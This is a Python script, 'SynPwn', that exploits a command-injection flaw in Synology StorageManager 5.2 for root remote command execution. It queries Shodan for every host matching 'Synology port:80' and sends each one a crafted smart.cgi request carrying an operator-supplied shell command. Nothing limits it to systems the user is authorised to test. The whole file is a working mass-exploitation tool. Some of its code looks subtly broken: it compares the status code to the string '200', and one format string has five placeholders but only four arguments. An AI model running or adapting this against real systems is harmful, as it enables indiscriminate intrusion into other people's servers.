## Author: LukeBob
## Python3 script for testing servers the (Synology StorageManager 5.2 - Root Remote Command Execution) https://www.exploit-db.com/exploits/43190/
## All credit to: (Weibo, SecuriTeam_SSD)
## 
 

import requests
import argparse
import shodan

parser = argparse.ArgumentParser(description="SynPwn, run remote code on Servers running 'Synology StorageManager 5.2'", epilog='Author: (Lukebob)')
parser.add_argument("--key", help='Shodan key')
parser.add_argument("--cmd", help='Command to run on system, if spaces in command wrap the command in quotes')
args = parser.parse_args()

## cloulors
class Color():
    @staticmethod
    def red(str):
        return("\033[91m" + str + "\033[0m")

    @staticmethod
    def green(str):
        return("\033[92m" + str + "\033[0m")

    @staticmethod
    def yellow(str):
        return("\033[93m" + str + "\033[0m")

    @staticmethod
    def blue(str):
        return("\033[94m" + str + "\033[0m")

## Creates New Shodan Api Object
def make_api(key):
    try:
        if len(key) > 1:
            api = shodan.Shodan(key)
            api.info()
        else:
            print(Color.red("[+] Error:")+" Please enter valid Api Key")
    except shodan.exception.APIError as e:
        print('[+] Error: %s' % e)
        exit(0)

    return(api)

## try's to run command on the target
def exploit(target):
    try:
        url = ("http://{0}/webman/modules/StorageManager/smart.cgi?action=apply&operation=quick&disk=/dev/sda'{1}''".format(target, args.cmd))
        r=requests.get(url)
        stat = r.status_code
        r.close()
        return(stat)
    except Exception as e:
        print(Color.red("[+] Error: ")+" {0}".format(e))
        pass



## gets targets to
def search(api):
    try:
        results = api.search("Synology port:80")
    except shodan.APIError as e:
        print(Color.red("[+] Error: ")+"{0}".format(e))
        exit(0)

    for result in results['matches']:
        country  = result['location']['country_name']
        hostname = result['hostnames']
        target   = result['ip_str']
        result   = exploit(target)
        if result == "200":
            print("""
---------------------------------------------------------------------------------------
[Target {0}]\t[Hostname {1}]\t[Country {2}]\t[Command {3}]\t[{4}]
---------------------------------------------------------------------------------------
            """.format(Color.green(target), hostname, Color.red(args.cmd), Color.green("Vulnerable")))

        elif result != "200":
            print("""
---------------------------------------------------------------------------------------
[Target {0}]\t[Hostname {1}]\t[Country {2}]\t[Command {3}]\t[{4}]
---------------------------------------------------------------------------------------
            """.format(Color.green(target), hostname, Color.red(args.cmd), Color.red("Not Vulnerable")))

def main():

    if args.cmd and args.key:
        api = make_api(args.key)
        search(api)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()


#usage: synpwn.py [-h] [--key KEY] [--cmd CMD]

#SynPwn, run remote code on Servers running 'Synology StorageManager 5.2'

#optional arguments:
#  -h, --help  show this help message and exit
#  --key KEY   Shodan key
#  --cmd CMD   Command to run on system

#Author's: (Lukebob, Woodsy310)

#C:\Users\Luke\Desktop\factorio-python>
